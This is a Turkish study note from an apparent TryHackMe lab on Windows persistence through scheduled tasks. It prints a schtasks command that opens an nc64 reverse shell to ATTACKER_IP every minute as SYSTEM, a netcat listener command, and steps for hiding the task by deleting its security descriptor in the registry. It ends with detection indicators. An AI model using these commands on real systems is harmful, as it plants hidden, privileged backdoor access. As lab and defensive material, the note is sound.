---
title: "Scheduled Tasks (schtasks) ile Persistence"
date: 2026-10-03
tags: [windows, persistence, scheduled-tasks]
---
# Scheduled Tasks (schtasks) ile Persistence

**Temel mantık**

Windows'un yerleşik **Task Scheduler**'ı (görev zamanlayıcı) persistence için güçlü bir araçtır çünkü bir payload'ın **ne zaman çalışacağı üzerinde ince ayar** sağlar: belirli saatlerde, periyodik aralıklarla, hatta belirli sistem olayları (event) tetiklendiğinde çalışacak görevler kurabilirsin. Önceki servis tekniğinden farkı burada: servis genelde "açılışta bir kez" çalışırken, zamanlanmış görev **tekrar tekrar** tetiklenebilir — yani shell'in kopsa bile dakikalar içinde yeniden bağlantı gelir. Komut satırından `schtasks` ile yönetilir.

---

#### Görev oluşturma

cmd

```cmd
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

Parametrelerin anlamı:

- **`/create`** → yeni görev oluştur.
- **`/sc minute`** → schedule (zamanlama) birimi: dakika. (günlük, saatlik, onlogon, onevent gibi seçenekler de var.)
- **`/mo 1`** → modifier: her **1** birimde bir, yani her dakika. (`/sc minute /mo 1` birlikte "her dakika" demek.)
- **`/tn THM-TaskBackdoor`** → task name (görev adı). _(Labda flag için bu ad birebir kullanılmalı.)_
- **`/tr "..."`** → task run: çalıştırılacak komut; burada `nc64` ile reverse shell.
- **`/ru SYSTEM`** → run as: görev **SYSTEM yetkisiyle** çalışır (en yüksek yerel yetki).

> Not: Gerçek bir operasyonda payload'ı her dakika çalıştırmazsın — bu kadar sık tetikleme çok gürültülü ve dikkat çekicidir. Labda beklememek için öyle ayarlanmış.

**Doğrulama:**

cmd

```cmd
schtasks /query /tn thm-taskbackdoor
```

Görevin `Ready` durumunda ve bir sonraki çalışma zamanının göründüğünü teyit edersin.

---

#### Görevi görünmez yapma (asıl sinsi kısım)

**Problem:** Görev çalışıyor ama ele geçirilen kullanıcı görevlerini listelerse backdoor görünür. Bunu gizlemek gerekir.

**Çözümün mantığı — Security Descriptor (SD) silme:**

Her zamanlanmış görevin bir **Security Descriptor**'ı vardır — bu, o göreve hangi kullanıcıların erişebileceğini belirten bir ACL'dir. Kilit nokta şu: **Windows sana yalnızca erişim iznin olan görevleri gösterir.** Bir görevi sorgulama/görme iznin yoksa, o görev senin için listede hiç yokmuş gibi davranır.

SD'yi tamamen silmek = **tüm kullanıcıların erişimini kaldırmak** (administrator dahil). Sonuç: görev çalışmaya devam eder ama **hiç kimse** onu `schtasks /query` ile göremez. Yetkiyi reddederek değil, yetki bilgisini yok ederek saklanır.

**SD nerede tutulur:**

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
```

Burada her görev için bir registry anahtarı, onun altında da **`SD`** adlı bir değer vardır (security descriptor'ı tutar).

**Önemli:** Bu `SD` değerini **yalnızca SYSTEM yetkisiyle** silebilirsin — Administrator bile doğrudan yetmez. Bu yüzden Regedit'i SYSTEM olarak açmak gerekir:

cmd

```cmd
c:\tools\pstools\PsExec64.exe -s -i regedit
```

(`-s` → SYSTEM bağlamı, `-i` → interaktif/GUI.)

Açılan Regedit'te THM-TaskBackdoor görevinin anahtarına git, `SD` değerini sil.

**Sonuç:** Artık görevi sorgulamaya çalışınca sistem "böyle bir dosya yok" der:

cmd

```cmd
C:\> schtasks /query /tn thm-taskbackdoor
ERROR: The system cannot find the file specified.
```

Görev gizli ama hâlâ aktif — her dakika tetiklenmeye devam eder.

---

#### Önemli noktalar

- **SYSTEM yetkisi iki yerde gerekli:** Hem görevi `/ru SYSTEM` ile çalıştırmak (payload'ın SYSTEM koşması için) hem de SD'yi silmek (gizleme için). SD silme olmadan görev çalışır ama görünür kalır.
- **Servis vs Scheduled Task:** İkisi de kalıcılık sağlar; scheduled task periyodik tetikleme ve esnek zamanlama (event-based dahil) sunduğu için daha esnektir. SD silme numarası ise servislerde olmayan ekstra bir gizlenme katmanıdır.
- **Reverse shell için listener:** Saldırgan makinede `nc -lvp 4449` açık tutulur; görev her tetiklendiğinde (burada her dakika) bağlantı düşer.

---

#### Tespit yüzeyi

- **Görev oluşturma olayları:** Event ID **4698** (scheduled task created) — SD silinse bile bu olay loglanmış olabilir; registry görünürlüğü gizlense de olay günlüğü kalır.
- **SD anomalisi:** `TaskCache\Tree\` altında **`SD` değeri eksik** olan görevler güçlü bir IOC'dir — normal görevlerin hepsinde SD bulunur. Registry'yi doğrudan (SYSTEM ile) tarayan bir savunmacı, `schtasks` görmese de bu "görünmez" görevleri yakalayabilir.
- **Diğer izler:** Alışılmadık `/tr` komutları (nc, powershell, bilinmeyen binary'ler), sık tetiklenen görevler ve görev tetiklenmesiyle çakışan beklenmedik ağ bağlantıları.

Özetle: `schtasks` ile SYSTEM yetkili periyodik bir backdoor kurulur, ardından registry'deki SD değeri SYSTEM yetkisiyle silinerek görev tüm kullanıcılardan gizlenir — çalışır ama görünmez bir kalıcılık elde edilir.

---

**Up:** [Windows Persistence - Index](Windows%20Persistence%20-%20Index.md)
**Related:** [Using Windows Services](Using%20Windows%20Services.md) · [Logon Based Persistence](Logon%20Based%20Persistence.md) · [Security Descriptor](Security%20Descriptor.md)
